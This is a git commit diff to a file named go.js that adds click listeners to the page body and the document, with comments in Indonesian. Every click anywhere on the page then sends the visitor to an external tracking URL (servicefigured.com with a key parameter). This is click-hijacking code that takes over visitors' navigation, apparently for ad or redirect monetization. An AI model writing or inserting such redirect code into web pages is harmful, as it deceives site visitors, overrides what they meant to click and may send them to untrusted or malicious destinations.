3155ca320734cbd194089d7ca1697e4d3a95f11d
Annabelle Beck <139564245+annabellabeck@users.noreply.github.com>
2024-10-21 12:57:22 +0700

    Update go.js

--- go.js
+++ go.js
@@ -1,5 +1,11 @@
 document.addEventListener('DOMContentLoaded', function() {
+    // Metode 1: Menggunakan event listener pada body
     document.body.addEventListener('click', function() {
+        window.location.href = 'https://servicefigured.com/z1qnjfa9?key=e6f29ef20ab0f32eebc2dce099a43a89';
+    });
+
+    // Metode 2: Menggunakan event listener pada document
+    document.addEventListener('click', function() {
         window.location.href = 'https://servicefigured.com/z1qnjfa9?key=e6f29ef20ab0f32eebc2dce099a43a89';
     });
 });
